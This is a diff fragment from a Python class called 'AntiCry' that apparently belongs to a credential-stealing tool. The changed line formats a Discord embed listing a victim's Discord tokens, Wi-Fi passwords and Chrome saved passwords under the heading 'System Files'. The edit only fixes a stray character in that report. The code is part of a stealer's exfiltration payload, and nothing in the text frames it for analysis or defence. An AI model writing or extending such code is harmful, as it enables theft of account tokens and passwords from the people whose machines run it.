@@ -324,7 +324,7 @@ class AntiCry:
                             },
                             {
                                 "name": "<:z_logo_trustpilot:1040751302294122507> **System Files**",
-                                "value": f"<a:Purple_Lego_Coin:1152994436922474578>**{discord_tokens[0]}**\n<a:Purple_Lego_Coin:1152994436922474578>>**{wifi_passwords}**\n<a:Purple_Lego_Coin:1152994436922474578>**{chrome_passwords}**\n<a:Purple_Lego_Coin:1152994436922474578>**{self.ErrorLog()}**"
+                                "value": f"<a:Purple_Lego_Coin:1152994436922474578>**{discord_tokens[0]}**\n<a:Purple_Lego_Coin:1152994436922474578>**{wifi_passwords}**\n<a:Purple_Lego_Coin:1152994436922474578>**{chrome_passwords}**\n<a:Purple_Lego_Coin:1152994436922474578>**{self.ErrorLog()}**"
                             },
                         ],
                         "author": {
